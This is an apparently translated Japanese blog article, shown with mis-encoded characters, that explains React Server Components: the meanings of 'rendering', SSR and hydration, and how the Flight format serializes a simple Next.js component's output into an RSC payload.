<p>ã€Œãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨ã„ã†è¨€è‘‰ã®ã•ã¾ã–ã¾ãªæ„å‘³ã«ã¤ã„ã¦ã¯ã€ç¢ºèªã—ãªãŒã‚‰èª¬æ˜ã‚’é€²ã‚ãŸã„ã¨æ€ã„ã¾ã™ã€‚ä¸€èˆ¬çš„ãªï¼ˆReactä»¥å¤–ã§ã®ï¼‰å®šç¾©ã‚’ã€Œå¤å…¸çš„ã€ã¨å‘¼ã³ã€Webé–‹ç™ºã®ç”¨èªã¨ã—ã¦å®šç¾©ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>ãƒ¬ãƒ³ãƒ€ãƒ¼ã€renderã€‘
ã€å‹•è©ã€‘ /rÃ©ndÉ™r/</p><ol>
<li>ï¼ˆå¤å…¸çš„ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ï¼‰DOMã¨CSSOMã‚’ã‚‚ã¨ã«ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã‚’è¨ˆç®—ã—ã€ç”»é¢ã«ãƒ”ã‚¯ã‚»ãƒ«ã‚’æç”»ã™ã‚‹ã“ã¨ã€‚</li>
<li>ï¼ˆReactã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ï¼‰ä»®æƒ³DOMã‚’æ§‹ç¯‰ã—ã¦æ›´æ–°ã™ã‚‹ãŸã‚ã«é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚ </li>
</ol></div></div>
<h2>DOMã¨ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°</h2>
<p>RSCã«ã¤ã„ã¦èª¬æ˜ã‚’é€²ã‚ã‚‹ã«ã¯ã€æ™‚é–“ã‚’é¡ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚é•·å¹´ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã®ä¸­å¿ƒæ¦‚å¿µã®ä¸€ã¤ã¨ã—ã¦ã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰HTMLã‚’é…ä¿¡ã™ã‚‹ã¨ã„ã†è€ƒãˆæ–¹ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ã‚µãƒ¼ãƒãƒ¼ä¸Šã«HTMLãƒ•ã‚¡ã‚¤ãƒ«ã‚’ï¼ˆNodeJSã‚„PHPãªã©ã®ã‚µãƒ¼ãƒãƒ¼æŠ€è¡“ã‚’ä½¿ã£ã¦ï¼‰ä½œæˆã™ã‚‹ã“ã¨ã‚’ã€å¤å…¸çš„ãªã€Œã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã‚„ã€Œã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã¨å‘¼ã³ã¾ã™ã€‚ã“ã‚Œã¯ã€å…ˆã»ã©èª¬æ˜ã—ãŸå¤å…¸çš„ãªã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®æ„å‘³ã¨ã‚‚é•ã„ã¾ã™ã€‚å¾“æ¥ã€ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã¨ã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã€ŒHTMLã®æ–‡å­—åˆ—ã‚’ç”Ÿæˆã™ã‚‹ã€ã“ã¨ã‚’æ„å‘³ã—ã¾ã—ãŸã€‚</p>
<p>ã“ã‚Œã«ã¯ã„ãã¤ã‹ã®åˆ©ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚ãƒ–ãƒ©ã‚¦ã‚¶ã¯HTMLã‚’ç´ æ—©ãDOMã«å¤‰æ›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ãŸã‚ã€HTMLã¯ã€Œãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§ç´ æ—©ããƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã€ã•ã‚Œã¾ã™ã€‚JavaScriptã§DOMã‚’æ›´æ–°ã™ã‚‹ã¨ã€ã‚‚ã£ã¨æ™‚é–“ãŒã‹ã‹ã‚Šã¾ã™ã€‚ã¾ãŸã€ã‚µãƒ¼ãƒãƒ¼ã®æ–¹ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚„ãƒ•ã‚¡ã‚¤ãƒ«ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã«è¿‘ã„ãŸã‚ã€ã“ã‚Œã‚‰ã®å‡¦ç†ã‚’ã‚ˆã‚ŠåŠ¹ç‡çš„ã«è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>ãƒ‡ãƒ¡ãƒªãƒƒãƒˆã¨ã—ã¦ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã¯å†åº¦HTMLã‚’è¦æ±‚ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€stateãŒå¤±ã‚ã‚Œã¦ã—ã¾ã„ã¾ã™ï¼ˆãƒšãƒ¼ã‚¸ãŒå†èª­ã¿è¾¼ã¿ã•ã‚Œã‚‹ï¼‰ã€‚</p>
<p>Webé–‹ç™ºã«ãŠã„ã¦ã¯ã€ãã®ãƒãƒ©ãƒ³ã‚¹ã‚’ã©ã†å–ã‚‹ã‹ãŒé•·å¹´èª²é¡Œã¨ãªã£ã¦ã„ã¾ã—ãŸã€‚ã‚µãƒ¼ãƒãƒ¼å´ã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚ŒãŸHTMLã¯ç´ æ—©ãè¡¨ç¤ºã•ã‚Œã¾ã™ãŒã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®JavaScriptã‚’é€šã˜ã¦DOMã‚’æ›´æ–°ã™ã‚‹ã¨ã€ãƒšãƒ¼ã‚¸ã®stateã‚’ç¶­æŒã—ãŸã¾ã¾å¤‰æ›´ã‚’åŠ ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<p>Reactã§ã¯ä¸¡æ–¹è¡Œãˆã¾ã™ãŒã€ãã‚Œã¯ä½•ã‚‚æ–°ã—ã„ã“ã¨ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚Reactã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®JavaScriptã‚’ä½¿ã£ã¦DOMã‚’æ›´æ–°ã—ã¾ã™ãŒã€ãƒ‡ãƒ™ãƒ­ãƒƒãƒ‘ãƒ¼ã¯ã‹ãªã‚Šå‰ã‹ã‚‰Reactã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã‚µãƒ¼ãƒãƒ¼å´ã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ï¼ˆSSRï¼‰ã™ã‚‹ã“ã¨ãŒã§ãã¦ã„ã¾ã—ãŸã€‚</p>
<p>ã‚µãƒ¼ãƒãƒ¼ï¼ˆNodeJSãªã©ã‚’é€šã˜ã¦ç‹¬è‡ªã®JavaScriptã‚¨ãƒ³ã‚¸ãƒ³ã‚’å®Ÿè¡Œï¼‰ã¯ã€ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã—ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹HTMLæ–‡å­—åˆ—ã‚’ç”Ÿæˆã—ã¾ã™ã€‚ãŸã ã—ã€å¤§ããªæ³¨æ„ç‚¹ãŒã‚ã‚Šã¾ã™ã€‚åŒã˜ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®JavaScriptã‚³ãƒ¼ãƒ‰ã‚‚ã™ã¹ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã—ã¦å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã£ãŸã®ã§ã™ã€‚</p>
<p>ãã‚Œã¯ãªãœã§ã—ã‚‡ã†ã‹ã€‚é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒè¿”ã™å€¤ã‚’ã‚‚ã¨ã«ä»®æƒ³DOMã‚’æ§‹ç¯‰ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã§ã™ã€‚ä»®æƒ³DOMã¯ãƒªã‚¢ãƒ«DOMã‚’ã€Œãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ãƒˆã€ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã‚Œã¯ä¾‹ãˆã°ã€ãƒœã‚¿ãƒ³ãŒã‚¯ãƒªãƒƒã‚¯ã•ã‚ŒãŸã¨ãã«ã€ã©ã®é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®ä¸­ã®ã©ã®ã‚¯ãƒªãƒƒã‚¯ã‚¤ãƒ™ãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã¹ãã‹ãŒã‚ã‹ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚è¦šãˆã¦ãŠã‹ãªãã¦ã¯ãªã‚‰ãªã„ã®ã¯ã€ReactãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã«ä¸¡æ–¹ã®ãƒ„ãƒªãƒ¼ï¼ˆDOMã¨ä»®æƒ³DOMï¼‰ãŒå­˜åœ¨ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã¨ã„ã†ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€Reactã«ãŠã‘ã‚‹SSRã§ã¯ã€é–¢æ•°ã‚’2å›å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆ1å›ã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§HTMLã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã€ã‚‚ã†1å›ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§ä»®æƒ³DOMã‚’ä½œæˆã™ã‚‹ãŸã‚ï¼‰ã€‚</p>
<p>å‚è€ƒã¾ã§ã«ã€SSRï¼ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä»¥ä¸‹ã«å¯è¦–åŒ–ã—ã¦ã„ã¾ã™ã€‚</p>
<div class="video"><video loop autoplay muted playsinline aria-labelledby="video-label" src="https://tonyalicea.dev/assets/blogvideos/RSC_SSRHydration.mp4"></video></div>
<p>ã“ã“ã§React Server Componentsã®ç™»å ´ã§ã™ã€‚RSCã¯ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å®Ÿè¡Œã•ã‚Œã‚‹Reactã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã€ã‚µ<strong>ãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®JavaScriptã‚³ãƒ¼ãƒ‰ã®é€ä¿¡ã¨å†å®Ÿè¡Œã‚’è¡Œã†ã“ã¨ãªã</strong>æ··åœ¨ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€ãƒ–ãƒ©ã‚¦ã‚¶ä¸Šã§DOMã®æ›´æ–°ã‚’å§‹ã‚ã‚‹å‰ã«ã€æœ€åˆã«ã‚µãƒ¼ãƒãƒ¼ä¸Šã§HTMLã‚’ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚</p>
<p>ãªãœå¯èƒ½ãªã®ã§ã—ã‚‡ã†ã‹ã€‚</p>
<p>ã¾ãšã¯ç”¨èªã®å®šç¾©ã‚’æ›´æ–°ã—ã¾ã—ã‚‡ã†ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>ãƒ¬ãƒ³ãƒ€ãƒ¼ã€renderã€‘
ã€å‹•è©ã€‘ /rÃ©ndÉ™r/ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°</p><ol>
<li>ï¼ˆå¤å…¸çš„ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ï¼‰DOMã¨CSSOMã‚’ã‚‚ã¨ã«ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã‚’è¨ˆç®—ã—ã€ç”»é¢ã«ãƒ”ã‚¯ã‚»ãƒ«ã‚’æç”»ã™ã‚‹ã“ã¨ã€‚</li>
<li>ï¼ˆReactã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚µã‚¤ãƒ‰ï¼‰ä»®æƒ³DOMã‚’æ§‹ç¯‰ã—ã¦æ›´æ–°ã™ã‚‹ãŸã‚ã«é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚ </li>
<li>ï¼ˆå¤å…¸çš„ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ï¼‰DOMã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹HTMLã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã€‚</li>
<li>ï¼ˆReactã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰SSRï¼‰DOMã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹HTMLã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã€‚</li>
</ol></div></div>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>ã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ç”Ÿæˆã¯ã©ã†ã‹?</strong></p><p>ã“ã“ã§å–ã‚Šä¸Šã’ã¦ã„ãªã„ã‚‚ã®ã®ä¸€ã¤ãŒSSGï¼ˆã‚µãƒ¼ãƒãƒ¼ã‚µã‚¤ãƒ‰ç”Ÿæˆï¼‰ã§ã™ã€‚ã“ã‚Œã¯ã€ã‚¢ãƒ—ãƒªã‚’ãƒ“ãƒ«ãƒ‰ã™ã‚‹ï¼ˆãƒ‡ãƒ—ãƒ­ã‚¤å¯èƒ½ã«ã™ã‚‹ï¼‰éš›ã«ã€HTMLã‚’ã‚ã‚‰ã‹ã˜ã‚ç”Ÿæˆã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€Client Componentsã¨Server Componentsã®ä¸¡æ–¹ã«å¯¾ã—ã¦è¡Œãˆã¾ã™ã€‚</p><p>SSGã®å®šç¾©ã¯ã€ä½œæˆä¸­ã®è¾æ›¸åéŒ²é …ç›®ã«ãŠã‘ã‚‹SSRã®å®šç¾©ã¨åŒã˜ã§ã™ã€‚ã“ã®è¨˜äº‹ã§ã¯ã€SSGã¨SSRã®é•ã„ã‚’æ˜ã‚‰ã‹ã«ã—ã¦ã‚‚ã‚ã¾ã‚Šå½¹ã«ç«‹ãŸãªã„ã®ã§è©³ã—ãã¯è¿°ã¹ã¾ã›ã‚“ãŒã€SSGã‚‚ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚</p></div></div>
<p>å…ˆã»ã©ã€ReactãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€DOMã¨ä»®æƒ³DOMã®ä¸¡æ–¹ã®ãƒ„ãƒªãƒ¼å…¨ä½“ãŒãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ¡ãƒ¢ãƒªä¸Šã«å­˜åœ¨ã—ãªãã¦ã¯ãªã‚‰ãªã„ã¨ãŠè©±ã—ã—ã¾ã—ãŸã€‚ã§ã¯ã€React Server ComponentsãŒã‚µãƒ¼ãƒãƒ¼ä¸Šã§ã®ã¿å®Ÿè¡Œã•ã‚Œã‚Œã°ã‚ˆãã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒJavaScriptã‚³ãƒ¼ãƒ‰ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒãªã„ã®ã¯ãªãœã§ã—ã‚‡ã†ã‹ã€‚</p>
<p>ã¤ã¾ã‚Šã€Reactã¯ã€Œã‚µãƒ¼ãƒãƒ¼ã€ä¸Šã§å®Ÿè¡Œã•ã‚ŒãŸé–¢æ•°ã«ã‚ˆã£ã¦ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã•ã‚ŒãŸéƒ¨åˆ†ã«ã¤ã„ã¦ã€ã©ã®ã‚ˆã†ã«ã—ã¦ã€Œãƒ–ãƒ©ã‚¦ã‚¶ã€ä¸Šã«ä»®æƒ³DOMã‚’æ§‹ç¯‰ã™ã‚‹ã®ã§ã—ã‚‡ã†ã‹ã€‚</p>
<h2>Flight</h2>
<p>ã‚µãƒ¼ãƒãƒ¼ä¸Šã§é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’å®Ÿè¡Œã—ã€ãã®çµæœã‚’ã‚‚ã¨ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã«ä»®æƒ³DOMã‚’æ§‹ç¯‰ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã€Reactã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚ŒãŸé–¢æ•°ãŒè¿”ã—ãŸReactè¦ç´ ãƒ„ãƒªãƒ¼ã‚’ã€Œã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã€ã™ã‚‹æ©Ÿèƒ½ã‚’è¿½åŠ ã—ã¾ã—ãŸã€‚</p>
<p>å¤šãã®å ´åˆã€ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã¯ã€Œã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã®ãƒ¡ãƒ¢ãƒªä¸Šã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ–‡å­—åˆ—ã«å¤‰æ›ã™ã‚‹ã€ã“ã¨ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã¯ã€Œæ–‡å­—åˆ—ã‚’ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã®ãƒ¡ãƒ¢ãƒªä¸Šã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«å¾©å…ƒã™ã‚‹ã€ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚</p>
<p>ã“ã®å ´åˆã€é–¢æ•°ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®çµæœã¯ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ã¦ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚</p>
<p>ç­†è€…ã®Reactã‚³ãƒ¼ã‚¹ã«ç™»éŒ²ã—ãŸç”Ÿå¾’ã®æ•°ã‚’æŠŠæ¡ã™ã‚‹ãŸã‚ã®ç°¡å˜ãªã‚¢ãƒ—ãƒªã‚’ä½œæˆã™ã‚‹ã¨ã—ã¾ã™ã€‚ã¾ãšã¯Next.jsã§åŸºæœ¬çš„ãªRSCã‚’ä½œæˆã—ã¾ã™ã€‚ã“ã‚Œã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p><strong>åŒå‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆ</strong></p><p>ã‚µãƒ¼ãƒãƒ¼ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ä¸¡æ–¹ã§å®Ÿè¡Œå¯èƒ½ãªã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‚’ã€ŒåŒå‹ï¼ˆisomorphicï¼‰ã€ã¨å‘¼ã³ã¾ã™ã€‚ä¸Šã®é–¢æ•°ã¯ã‚µãƒ¼ãƒãƒ¼ã«ç‰¹åŒ–ã—ãŸã“ã¨ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ç›´æ¥æ¥ç¶šã™ã‚‹ã€ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã‚€ãªã©ï¼‰ã‚’ä½•ã‚‚è¡Œã‚ãªã„ãŸã‚ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã‚ã‚Šã€Reactã¯é€šå¸¸ã©ãŠã‚Šç›´æ¥ãã®çµæœã‚’ã‚‚ã¨ã«ä»®æƒ³DOMã‚’æ§‹ç¯‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p><p>é–¢æ•°ãŒåŒå‹ã§ã‚ã‚‹å ´åˆã€å…±æœ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚Server Componentsã¨Client Componentsã®ã©ã¡ã‚‰ã‚‚ãã‚Œã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¦ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚</p></div></div>
<p>ã“ã®é–¢æ•°ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ä¿¡ã—ãªãã¦ã‚‚ã„ã„ã‚ˆã†ã«ã€ãã®çµæœã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚Reactã®ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã®ä¸­ã§ã¯ã€ã“ã®ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºå½¢å¼ã‚’ã€ŒFlightã€ã¨å‘¼ã³ã€é€ä¿¡ã—ãŸãƒ‡ãƒ¼ã‚¿ã®ç·å’Œã‚’ã€ŒRSC Payloadã€ã¨å‘¼ã³ã¾ã™ã€‚</p>
<p>ç­†è€…ã®ç°¡å˜ãªé–¢æ•°ã®çµæœã‚’ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºã—ãŸã‚‚ã®ãŒä»¥ä¸‹ã§ã™ã€‚</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">"[\"$\",\"main\",null,{\"children\":[\"$\",\"h1\",null,{\"children\":\"understandingreact.com\"},\"$c\"]},\"$c\"]"</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>åˆ†æã—ã‚„ã™ã„ã‚ˆã†ã«ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã—ã¦ã¿ã¾ã—ã‚‡ã†ï¼ˆAlvar LagerlÃ¶fæ°ãŒä½œæˆã—ãŸ<a href="https://github.com/alvarlagerlof/rsc-parser">RSCãƒ‘ãƒ¼ã‚µãƒ¼</a>ã‚’ä½¿ç”¨ï¼‰ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
  <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"main"</span><span class="token punctuation">,</span>
  <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
  <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
    <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
    <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ä»®æƒ³DOMã®æ§‹é€ ãŒè¦‹ãˆã‚‹ã§ã—ã‚‡ã†ã‹ã€‚<code class="language-text">main</code>è¦ç´ ã¨<code class="language-text">h1</code>è¦ç´ ã€ãƒ—ãƒ¬ãƒ¼ãƒ³ãƒ†ã‚­ã‚¹ãƒˆãƒãƒ¼ãƒ‰ã‚‚ã‚ã‚Šã¾ã™ã€‚propsã€ç‰¹ã«Reactç‰¹æœ‰ã®æ¨™æº–ã®children propsã¨ã—ã¦æ¸¡ã•ã‚Œã¦ã„ã‚‹ã‚‚ã®ã‚‚ç¢ºèªã§ãã¾ã™ã€‚</p>
<p>ã“ã“ã§ã¯å˜ç´”åŒ–ã—ãŸä¾‹ã‚’ç”¨ã„ã¦èª¬æ˜ã—ã¦ã„ã¾ã™ãŒã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆã®è¦ç´ ã¯ã“ã‚Œã ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ã¾ãŸã€ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã•ã‚‰ã«å¤šãã®è¦ç´ ãŒè¿½åŠ ã•ã‚Œã¾ã™ã€‚ä¾‹ãˆã°ã€ã€ŒFlightã€ã‚’è¡¨ã™ã€Œf:ã€ãªã©ã€ãƒ„ãƒªãƒ¼ã«è¿½åŠ ã™ã‚‹ã‚‚ã®ã‚’è¡¨ã™è­˜åˆ¥å­ãªã©ã§ã™ã€‚ã—ã‹ã—ã€ã“ã“ã§å¿…è¦ãªç†è§£ã‚’å¾—ã‚‹ãŸã‚ã«ã¯å˜ç´”åŒ–ã—ãŸä¾‹ã§ååˆ†ã§ã™ã€‚</p>
